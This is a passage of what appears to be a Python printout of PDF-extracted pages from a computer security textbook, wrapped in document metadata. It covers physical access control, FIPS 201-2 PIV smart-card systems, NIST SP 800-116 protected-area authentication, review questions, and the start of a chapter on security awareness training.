of access control include controlled areas patrolled \\nor guarded by personnel, barriers that isolate each area, entry points in the barrier \\n(doors), and locks or screening measures at each entry point.\\nPhysical access control should address not just computers and other IS equip-\\nment, but also locations of wiring used to connect systems, the electrical power service, \\nM16_STAL0611_04_GE_C16.indd   540 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 542, 'page_label': '541'}, page_content='16.5 / EXAMPlE: A CORPORATE PHySICAl SECuRITy POlICy  541\\nthe HVAC equipment and distribution system, telephone and  communications lines, \\nbackup media, and documents.\\nIn addition to physical and procedural barriers, an effective physical access \\ncontrol regime includes a variety of sensors and alarms to detect intruders and \\n unauthorized access or movement of equipment. Surveillance systems are frequently \\nan integral part of building security, and special-purpose surveillance systems for the \\nIS area are generally also warranted. Such systems should provide real-time remote \\nviewing as well as recording.\\nFinally, the introduction of Wi-Fi changes the concept of physical security in \\nthe sense that it extends physical access across physical boundaries such as walls and \\nlocked doors. For example, a parking lot outside of a secure building provides access \\nvia Wi-Fi. This type of threat and the measures to deal with it will be discussed in \\nChapter 24.\\n 16.4 RECOVERY FROM PHYSICAL SECURITY BREACHES\\nThe most essential element of recovery from physical security breaches is  redundancy. \\nRedundancy does not undo any breaches of confidentiality, such as the theft of data \\nor documents, but it does provide for recovery from loss of data. Ideally, all of the \\nimportant data in the system should be available off site and updated as near to real \\ntime as is warranted based on a cost/benefit trade-off. With broadband connections \\nnow almost universally available, batch encrypted backups over private networks or \\nthe Internet are warranted and can be carried out on whatever schedule is deemed \\nappropriate by management. In the most critical situations, a hot site can be created \\noff site that is ready to take over operation instantly and has available to it a near-\\nreal-time copy of operational data.\\nRecovery from physical damage to the equipment or the site depends on the \\nnature of the damage and, importantly, the nature of the residue. Water, smoke, \\nand fire damage may leave behind hazardous materials that must be meticulously \\nremoved from the site before normal operations and the normal equipment suite can \\nbe reconstituted. In many cases, this requires bringing in disaster recovery specialists \\nfrom outside the organization to do the cleanup.\\n 16.5 EXAMPLE: A CORPORATE PHYSICAL SECURITY POLICY\\nTo give the reader a feel for how organizations deal with physical security, we pro -\\nvide a real-world example of a physical security policy. The company is an EU-based \\nengineering consulting firm that specializes in the provision of planning, design, and \\nmanagement services for infrastructure development worldwide. With interests in \\ntransportation, water, maritime, and property, the company is undertaking commis-\\nsions in over 70 countries from a network of more than 70 offices.\\nSection 1 of the document SecurityPolicy.pdf, available at https://app.box  \\n.com/v/CompSec4e, is extracted from the company’s security standards  document.1 \\n1The entire document CompanyPolicy.pdf is available at the same location.\\nM16_STAL0611_04_GE_C16.indd   541 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 543, 'page_label': '542'}, page_content='542  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\nFor our purposes, we have changed the name of the company to Company wherever \\nit appears in the document. The company’s physical security policy relies heavily on \\nISO 27002.\\n 16.6 INTEGRATION OF PHYSICAL AND LOGICAL SECURITY\\nPhysical security involves numerous detection devices, such as sensors and alarms, \\nand numerous prevention devices and measures, such as locks and physical barriers. It \\nshould be clear that there is much scope for automation and for the integration of vari-\\nous computerized and electronic devices. Clearly, physical security can be made more \\neffective if there is a central destination for all alerts and alarms and if there is central \\ncontrol of all automated access control mechanisms, such as smart card entry sites.\\nFrom the point of view of both effectiveness and cost, there is increasing inter-\\nest not only in integrating automated physical security functions but in integrating, \\nto the extent possible, automated physical and logical security functions. The most \\npromising area is that of access control. Examples of ways to integrate physical and \\nlogical access control include the following:\\n• Use of a single ID card for physical and logical access . This can be a simple \\nmagnetic-strip card or a smart card.\\n• Single-step user/card enrollment and termination across all identity and access \\ncontrol databases.\\n• A central ID-management system instead of multiple disparate user directories \\nand databases.\\n• Unified event monitoring and correlation.\\nAs an example of the utility of this integration, suppose an alert indicates that \\nBob has logged on to the company’s wireless network (an event generated by the \\nlogical access control system) but did not enter the building (an event generated \\nfrom the physical access control system). Combined, these two events suggest that \\nsomeone is hijacking Bob’s wireless account.\\nPersonal Identity Verification\\nFor the integration of physical and logical access control to be practical, a wide range \\nof vendors must conform to standards that cover smart card protocols, authentication \\nand access control formats and protocols, database entries, message formats, and so \\non. An important step in this direction is FIPS 201 -2 [Personal Identity Verification \\n(PIV) of Federal Employees and Contractors , August 2013]. This standard defines \\na reliable, government-wide PIV system for use in applications such as access to \\nfederally controlled facilities and information systems. The standard specifies a PIV \\nsystem within which common identification credentials can be created and later used \\nto verify a claimed identity. The standard also identifies Federal government-wide \\nrequirements for security levels that are dependent on risks to the facility or informa-\\ntion being protected. The standard applies to private-sector contractors as well, and \\nserves as a useful guideline for any organization.\\nM16_STAL0611_04_GE_C16.indd   542 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 544, 'page_label': '543'}, page_content='16.6 / InTEGRATIOn Of PHySICAl And lOGICAl SECuRITy  543\\nFigure 16.2 illustrates the major components of FIPS 201 -2 compliant systems. \\nThe PIV front end defines the physical interface to a user who is requesting access \\nto a facility, which could either be physical access to a protected physical area or \\nlogical access to an information system. The PIV front end subsystem  supports up \\nto three-factor authentication; the number of factors used depends on the level of \\nsecurity required. The front end makes use of a smart card, known as a PIV card, \\nwhich is a dual-interface contact and contactless card. The card holds a cardholder \\nphotograph, X.509 certificates, cryptographic keys, biometric data, and a cardholder \\nunique identifier (CHUID), explained subsequently. Certain cardholder information \\nmay be read-protected and require a personal identification number (PIN) for read \\naccess by the card reader. The biometric reader, in the current version of the standard, \\nis a fingerprint reader or an iris scanner.\\nThe standard defines three assurance levels for verification of the card and the \\nencoded data stored on the card, which in turn leads to verifying the authenticity of \\nthe person holding the credential. A level of some confidence corresponds to use of \\nthe card reader and PIN. A level of high confidence adds a biometric comparison of a \\nfingerprint captured and encoded on the card during the card-issuing process and a fin-\\ngerprint scanned at the physical access point. A very high confidence level requires that \\nthe process just described is completed at a control point attended by an official observer.\\nFigure 16.2 FIPS 201 PIV System Model\\nAccess control\\nAuthorization\\ndata\\nAuthorization\\ndata\\nPhysical access control\\nI&A Authorization\\nI&A Authorization\\nLogical access control\\nPhysical\\nresource\\nLogical\\nresource\\nI&A = Identification and authentication\\nLEGEND\\nDirection of information ﬂow\\nCared reader/\\nwriter\\nPIV card issuance\\nand management\\nIdentity proﬁling\\n& registration\\nCard issuance\\n& maintenance\\nKey\\nmanagement\\nPKI directory &\\ncertiﬁcate status\\nresponder\\nPIV card\\nPIN input\\ndevice\\nBiometric\\nreader\\nPIV front end\\nShapes\\nShading\\nProcesses\\nComponents\\nPIV subsystems\\nRelated subsystem\\nM16_STAL0611_04_GE_C16.indd   543 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 545, 'page_label': '544'}, page_content='544  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\nThe other major component of the PIV system is the PIV card issuance and \\nmanagement subsystem . This subsystem includes the components responsible for \\nidentity proofing and registration, card and key issuance and management, and the \\nvarious repositories and services (e.g., public key infrastructure [PKI] directory, \\n certificate status servers) required as part of the verification infrastructure.\\nThe PIV system interacts with an access control subsystem , which includes \\ncomponents responsible for determining a particular PIV cardholder’s access to a \\nphysical or logical resource. FIPS 201 -2 standardizes data formats and protocols for \\ninteraction between the PIV system and the access control system.\\nUnlike the typical card number/facility code encoded on most access control \\ncards, the FIPS 201 -2 CHUID takes authentication to a new level, through the use of \\nan expiration date (a required CHUID data field) and an optional CHUID digital \\nsignature. A digital signature can be checked to ensure that the CHUID recorded on \\nthe card was digitally signed by a trusted source, and that the CHUID data have not \\nbeen altered since the card was signed. The CHUID expiration date can be checked \\nto verify that the card has not expired. This is independent from whatever expira -\\ntion date is associated with cardholder privileges. Reading and verifying the CHUID \\nalone provides only some assurance of identity because it authenticates the card data, \\nnot the cardholder. The PIN and biometric factors provide identity verification of \\nthe individual.\\nFigure 16.3, based on [FORR06], illustrates the convergence of physical and \\nlogical access control using FIPS 201 -2. The core of the system includes the PIV and \\nFigure 16.3 Convergence Example\\nSource: Based on [FORR06].\\nPhysical access control\\nsystem (PACS) serverContactless\\nsmart card reader\\nOptional\\nbiometric\\nreader\\nOptional\\nbiometric\\nreader\\nOptional\\nbiometric\\nreader\\nVending, e-purse and\\nother applications\\nCard enrollment\\nstation\\nCamera\\nCard\\nprinter\\nSmart card\\nprogrammer\\nOther user directories\\nActive directory\\nHuman resources\\ndatabase\\nSmart card\\nreader\\nSmart card\\nreader\\nCertiﬁcate\\nauthority\\nPIV\\nsystem Smart card and\\nbiometric middleware\\nAccess\\ncontrol\\nsystem\\nM16_STAL0611_04_GE_C16.indd   544 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 546, 'page_label': '545'}, page_content='16.6 / InTEGRATIOn Of PHySICAl And lOGICAl SECuRITy  545\\naccess control system as well as a certificate authority for signing CHUIDs. The other \\nelements of the figure provide examples of the use of the system core for integrating \\nphysical and logical access control.\\nIf the integration of physical and logical access control extends beyond a unified \\nfront end to an integration of system elements, a number of benefits accrue, including \\nthe following [FORR06]:\\n• Employees gain a single, unified access control authentication device; this cuts \\ndown on misplaced tokens, reduces training and overhead, and allows seam -\\nless access.\\n• A single logical location for employee ID management reduces duplicate data \\nentry operations and allows for immediate and real-time authorization revo -\\ncation of all enterprise resources.\\n• Auditing and for ensic groups have a central repository for access control \\ninvestigations.\\n• Hardware unification can reduce the number of vendor purchase-and-support \\ncontracts.\\n• Certificate-based access control systems can leverage user ID certificates for \\nother security applications, such as document e-signing and data encryption.\\nUse of PIV Credentials in Physical Access Control Systems\\nFIPS 201 -2 defines characteristics of the identity credential that can be interoperable \\ngovernment-wide. It does not, however, provide specific guidance for applying this \\nstandard as part of a physical access control system (PACS) in an environment in \\nwhich one or more levels of access control is desired. To provide such guidance, NIST \\nSP 800-116 ( A Recommendation for the Use of PIV Credentials in Physical Access \\nControl Systems (PACS), 2008), was issued and is being revised as of 2017 .\\nNIST SP 800-116 makes use of the following authentication mechanisms:\\n• Visual (VIS):  Visual identity verification of a PIV card is done by a human \\nguard. The human guard checks to see that the PIV card looks genuine, com -\\npares the cardholder’s facial features with the picture on the card, checks \\nthe expiration date printed on the card, verifies the correctness of other data \\nelements printed on the card, and visually verifies the security feature(s) on \\nthe card.\\n• Cardholder unique identifier (CHUID): The CHUID is a PIV card data object. \\nAuthentication is implemented by transmission of the CHUID from the PIV \\ncard to PACS.\\n• Biometric (BIO): Authentication is implemented by using a fingerprint or iris \\ndata object sent from the PIV card to the PACS.\\n• Attended biometric (BIO-A):  This authentication mechanism is the same as \\nBIO authentication, but an attendant supervises the use of the PIV card and \\nthe submission of the PIN and the sample biometric by the cardholder.\\n• PIV authentication key (PKI): PACS may be designed to perform public key \\ncryptography-based authentication using the PIV authentication key. Use of \\nM16_STAL0611_04_GE_C16.indd   545 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 547, 'page_label': '546'}, page_content='546  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\nthe PKI provides two-factor authentication, since the cardholder must enter a \\nPIN to unlock the card in order to successfully authenticate.\\n• Card authentication key (CAK): The CAK is an optional key that may be pres-\\nent on any PIV card. The purpose of the CAK authentication mechanism is to \\nauthenticate the card and therefore its possessor. The CAK is unique among \\nthe PIV keys in several respects: The CAK may be used on the contactless or \\ncontact interface in a challenge/response protocol; and the use of the CAK does \\nnot require PIN entry.\\nAll of these authentication mechanisms, except for CAK, are defined in FIPS \\n201 -2. CAK is an optional PIV mechanism defined in NIST SP 800-116. NIST SP \\n800-116 is designed to address an environment in which different physical access \\npoints within a facility do not all have the same security requirements, and therefore \\nthe PIV  authentication mechanism should be selected to conform to the security \\nrequirements of the different protected areas.\\nNIST SP 800-116 recommends that authentication mechanisms be selected \\non the basis of protective areas established around assets or resources. The docu -\\nment adopts the concept of “Controlled, Limited, Exclusion” areas, as defined in \\n[ARMY10] and summarized in Table 16.6. Procedurally, proof of affiliation is often \\nsufficient to gain access to a controlled area (e.g., an agency’s badge to that agency’s \\nheadquarters’ outer perimeter). Access to limited areas is often based on functional \\nsubgroups or roles (e.g., a division badge to that division’s building or wing). The \\nindividual membership in the group or privilege of the role is established by authen-\\ntication of the identity of the cardholder. Access to exclusion areas may be gained by \\nindividual authorization only.\\nFigure 16.4a illustrates a general model defined in NIST SP 800-116. The model \\nindicates alternative authentication mechanisms that may be used for access to \\nspecific areas. The model is designed such that at least one authentication factor is \\nrequired to enter a controlled area, two factors for a limited area, and three factors \\nfor an exclusion area.\\nClassification Description\\nUnrestricted An area of a facility that has no security interest.\\nControlled That portion of a restricted area usually near or surrounding a limited or \\nexclusion area. Entry to the controlled area is restricted to personnel with \\na need for access. Movement of authorized personnel within this area is not \\nnecessarily controlled since mere entry to the area does not provide access \\nto the security interest. The controlled area is provided for administrative \\ncontrol, for safety, or as a buffer zone for in-depth security for the limited or \\nexclusion area.\\nLimited Restricted area within close proximity of a security interest. Uncontrolled \\nmovement may permit access to the security interest. Escorts and other \\n internal restrictions may prevent access within limited areas.\\nExclusion A restricted area containing a security interest. Uncontrolled movement \\n permits direct access to the security interest.\\nTable 16.6 Degrees of Security and Control for Protected Areas [ARMY10]\\nM16_STAL0611_04_GE_C16.indd   546 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 548, 'page_label': '547'}, page_content='16.6 / InTEGRATIOn Of PHySICAl And lOGICAl SECuRITy  547\\nFigure 16.4b is an example of the application of NIST SP 800-116 principles to \\na  commercial, academic, or government facility. A visitor registration area is available \\nto all. In this example, the entire facility beyond visitor registration is a controlled \\narea available to authorized personnel and their visitors. This may be considered a \\nrelatively low-risk area, in which some confidence in the identity of those entering \\nshould be achieved. A one-factor authentication mechanism, such as CHUID+VIS \\nFigure 16.4 Use of Authentication Mechanisms for Physical Access \\nControl\\n(a) Access control model\\nVisitor\\nRegistration\\nHQ\\nFacility services\\nAdmin\\nBuildings\\n(b) Example use\\nExclusion\\nLimited\\nControlled\\nUnrestricted\\nCHUID+VIS CAK\\nCAK+BIO-A\\nBIO\\nPKI\\nC\\nB\\nA\\nRoom housing\\ntrade secrets\\nBuilding housing lab space\\nand other sensitive areas\\nFenced-in area\\ncontaining a\\nnumber of buildings\\nEXCLUSION\\nAREALIMITED  \\nAREA\\nCONTROLLED\\nAREA\\nC\\nB\\nA\\nM16_STAL0611_04_GE_C16.indd   547 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 549, 'page_label': '548'}, page_content='548  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\nor CAK, would be an appropriate security measure for this portion of the facility. \\nWithin the controlled area is a limited area restricted to a specific group of indi -\\nviduals. This may be considered a moderate-risk facility and a PACS should provide \\nadditional security to the more valuable assets. High confidence in the identity of \\nthe cardholder should be achieved for access. Implementation of BIO-A or PKI \\nauthentication mechanisms would be an appropriate countermeasure for the lim -\\nited area. Combined with the authentication at access point A, this provides two-\\nfactor authentication to enter the limited area. Finally, within the limited area is a \\nhigh-risk exclusion area restricted to a specific list of individuals. The PACS should \\nprovide very high confidence in the identity of a cardholder for access to the exclu -\\nsion area. This could be provided by adding a third authentication factor, different \\nfrom those used at access points A and B.\\nThe model illustrated in Figure 16.4a, and the example in Figure 16.4b, depicts a \\nnested arrangement of restricted areas. This arrangement may not be suitable for all \\nfacilities. In some facilities, direct access from outside to a limited area or an exclusion \\narea may be necessary. In that case, all of the required authentication factors must \\nbe employed at the access point. Thus a direct access point to an exclusion area may \\nemploy, in combination, CHUID+VIS, BIO or BIO-A, and PKI.\\n 16.7 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\ncorporate security\\nenvironmental threats\\nfacilities security\\ninfrastructure  \\nsecurity\\nlogical security\\nnoise\\novervoltage\\npersonal identity verification \\n(PIV)\\nphysical access control system \\n(PACS)\\nphysical security\\npremises security\\ntechnical threats\\nundervoltage\\nReview Questions\\n 16.1 What is the difference between infrastructure security and premises security?\\n 16.2 List and describe three categories of physical threats caused by humans.\\n 16.3 What are the threats posed by water?\\n 16.4 List and describe some measures for dealing with inappr opriate temperature and \\nhumidity.\\n 16.5 List and describe some measures for dealing with fire.\\n 16.6 List and describe some measures for dealing with water damage.\\n 16.7 List and describe some measures for dealing with power loss.\\n 16.8 List and describe some measures for dealing with human-caused physical threats.\\n 16.9 Briefly define the three major sub-systems in the FIPS 20 1 PIV Model illustrated in \\nFigure 16.2.\\n 16.10 Briefly define the four protected area types described in NIST SP 800-116.\\nM16_STAL0611_04_GE_C16.indd   548 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 550, 'page_label': '549'}, page_content='16.7 / KEy TERMS, REVIEW QuESTIOnS, And PROBlEMS  549\\nProblems\\n 16.1 Table 16.7 is an extract from the Technology Risk Checklist, published by the World \\nBank [WORL04] to provide guidance to financial institutions and other organization. \\nThis extract is the physical security checklist portion. Compare this to the security \\npolicy outlined in Section 1 of the document SecurityPolicy.pdf, available at https://\\napp.box.com/v/CompSec4e. What are the overlaps and the differences?\\n54. Do your security policies restrict physical access to networked systems facilities?\\n55. Are your physical facilities access-controlled through biometrics or smart cards, in order to \\n prevent unauthorized access?\\n56. Does someone regularly check the audit trails of key card access systems? Does this note how \\nmany failed logs have occurred?\\n57. Are backup copies of software stored in safe containers?\\n58. Are your facilities securely locked at all times?\\n59. Do your network facilities have monitoring or surveillance systems to track abnormal activity?\\n60. Are all unused “ports” turned off?\\n61. Are your facilities equipped with alarms to notify of suspicious intrusions into systems rooms \\nand facilities?\\n62. Are cameras placed near all sensitive areas?\\n63. Do you have a fully automatic fire suppression system that activates when it detects heat, \\nsmoke, or particles?\\n64. Do you have automatic humidity controls to prevent potentially harmful levels of humidity \\nfrom ruining equipment?\\n65. Do you utilize automatic voltage control to protect IT assets?\\n66. Are ceilings reinforced in sensitive areas (e.g., server room)?\\nTable 16.7 World Bank Physical Security Checklist\\nIT Security\\nPhysical \\nSecurity\\nBoundary type (what \\n constitutes the perimeter)\\nStandards\\nMaturity\\nFrequency of attacks\\nAttack responses  \\n(types of responses)\\nRisk to attackers\\nEvidence of compromise\\n 16.2 Are any issues addr essed in either Table 16.7 or Section 1 of SecurityPolicy.pdf that \\nare not covered in this chapter? If so, discuss their significance.\\n 16.3 Are any issues addr essed in this chapter that are not covered in Section 1 of  \\nSecurityPolicy.pdf? If so, discuss their significance.\\n 16.4 Fill in the entries in the following table by providing brief descriptions.\\nM16_STAL0611_04_GE_C16.indd   549 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 551, 'page_label': '550'}, page_content='17.1 Security Awareness, Training, and Education\\nMotivation\\nA Learning Continuum\\nAwareness\\nTraining\\nEducation\\n17.2 Employment Practices and Policies\\nSecurity in the Hiring Process\\nDuring Employment\\nTermination of Employment\\n17.3 E-Mail and Internet Use Policies\\nMotivation\\nPolicy Issues\\nGuidelines for Developing a Policy\\n17.4 Computer Security Incident Response Teams\\nDetecting Incidents\\nTriage Function\\nResponding to Incidents\\nDocumenting Incidents\\nInformation Flow for Incident Handling\\n17.5 Key Terms, Review Questions, and Problems\\nHuman Resources Security\\nCHAPTER \\n \\n550\\nM17_STAL0611_04_GE_C17.indd   550 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 552, 'page_label': '551'}, page_content='17.1 / SECURITY A WARENESS, TRAINING, AND EDUCATION  551\\nThis chapter covers a number of topics that, for want of a better term, we categorize \\nas human resources security. The subject is a broad one, and a full discussion is well \\nbeyond the scope of this book. In this chapter, we look at some important issues in \\nthis area.\\n 17.1 SECURITY AWARENESS, TRAINING, AND EDUCATION\\nThe topic of security awareness, training, and education is mentioned prominently \\nin a number of standards and standards-related documents, including ISO 27002 \\n(Code of Practice for Information Security Management , 2013) and NIST SP 800-\\n100 (Information Security Handbook: A Guide for Managers , October 2006). This \\nsection provides an overview of the topic.\\nMotivation\\nSecurity awareness, training, and education programs provide four major benefits to \\norganizations:\\n• Improving employee behavior\\n• Increasing the ability to hold employees accountable for their actions\\n• Mitigating liability of the organization for an employee’s behavior\\n• Complying with regulations and contractual obligations\\nEmployee behavior is a critical concern in ensuring the security of computer \\nsystems and information assets. A number of recent surveys show that employee \\nactions, both malicious and unintentional, cause considerable computer-related loss \\nand security compromises (e.g., [SYMA16] and [VERI16]). The principal problems \\nassociated with employee behavior are social engineering and phishing attacks, errors \\nand omissions, fraud, and actions by disgruntled employees. Security awareness, train-\\ning, and education programs can assist in reducing incidences of these problems.\\nSuch programs can serve as a deterrent to fraud and actions by disgruntled \\nemployees by increasing employees’ knowledge of their accountability  and of \\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Describe the benefits of security awareness, training, and education programs.\\n ◆ Present a survey of employment practices and policies.\\n ◆ Discuss the need for e-mail and Internet use policies and provide guidelines \\nfor developing such policies.\\n ◆ Explain the role of computer security incident response teams.\\n ◆ Describe the major steps involved in responding to a computer security \\nincident.\\nM17_STAL0611_04_GE_C17.indd   551 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 553, 'page_label': '552'}, page_content='552  CHAPTER 17 / HUmAN RESOURCES SECURITY\\npotential penalties. Employees cannot be expected to follow policies and procedures \\nof which they are unaware. Further, enforcement is more difficult if employees can \\nclaim ignorance when caught in a violation.\\nOngoing security awareness, training, and education programs are also \\nimportant in limiting an organization’s liability . Such programs can bolster an \\norganization’s claim that a standard of due care has been taken in protecting \\ninformation.\\nFinally, security awareness, training, and education programs may be needed to \\ncomply with regulations and contractual obligations . For example, companies that \\nhave access to information from clients may have specific awareness and training \\nobligations that they must meet for all employees with access to client data.\\nA Learning Continuum\\nA number of NIST documents, as well as ISO 27002, recognize that the learning \\nobjectives for an employee with respect to security depend on the employee’s role. \\nThere is a need for a continuum of learning programs that starts with awareness, \\nbuilds to training, and evolves into education. Figure 1 7.1 shows a model that out -\\nlines the learning needed as an employee assumes different roles and responsibili -\\nties with respect to information systems, including equipment and data. Beginning \\nat the bottom of the model, all employees need an awareness of the importance \\nof security and a general understanding of policies, procedures, and restrictions. \\nTraining, represented by the two middle layers, is required for individuals who \\nwill be using Information Technology (IT) systems and data and therefore need \\nmore detailed knowledge of IT security threats, vulnerabilities, and safeguards. The \\ntop layer applies primarily to individuals who have a specific role centered on IT \\n systems, such as programmers and those involved in maintaining and managing \\nIT\\xa0assets and those involved in IT security.\\nNIST SP 800-16 (Information Technology Security Training Requirements: A\\xa0Role- \\nand Performance-Based Model, April 1998) summarizes the four layers as follows:\\n• Security awareness  is explicitly r equired for all employees, whereas secu -\\nrity basics and literacy is required for those employees, including contrac -\\ntor employees, who are involved in any way with IT systems. In today’s \\nenvironment, the latter category includes almost all individuals within the \\norganization.\\n• The security basics and literacy  category is a transitional stage between \\nawareness and training. It provides the foundation for subsequent training \\nby providing a universal baseline of key security terms and concepts.\\n• After security basics and literac y, training becomes focused on providing the \\nknowledge, skills, and abilities specific to an individual’s roles and responsi -\\nbilities relative to IT systems. At this level, training recognizes the differences \\namong beginning, intermediate, and advanced skill requirements.\\n• The education and experience  level focuses on developing the ability and \\nvision to perform complex, multidisciplinary activities and the skills needed \\nto further the IT security profession and to keep pace with threat and technol-\\nogy changes.\\nM17_STAL0611_04_GE_C17.indd   552 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 554, 'page_label': '553'}, page_content='17.1 / SECURITY A WARENESS, TRAINING, AND EDUCATION  553\\nFigure 17.1 Information Technology (IT) Learning Continuum\\nB = beginning\\nI = intermediate\\nA = advanced\\nTable 1 7.1 illustrates some of the distinctions among awareness, training, and \\neducation. We look at each of these categories in turn.\\nAwareness, Basics, and Literacy\\nIn general, a security awareness program seeks to inform and focus an employee’s \\nattention on issues related to security within the organization. Such programs may \\nalso include security basics and literacy elements, given the widespread use of IT in \\norganizations. The hoped-for benefits from security awareness include the following:\\n1. Employees are aware of their responsibilities for maintaining security and the \\nrestrictions on their actions in the interests of security, and are motivated to act \\naccordingly.\\nM17_STAL0611_04_GE_C17.indd   553 10/11/17   3:10 PM'),\n",
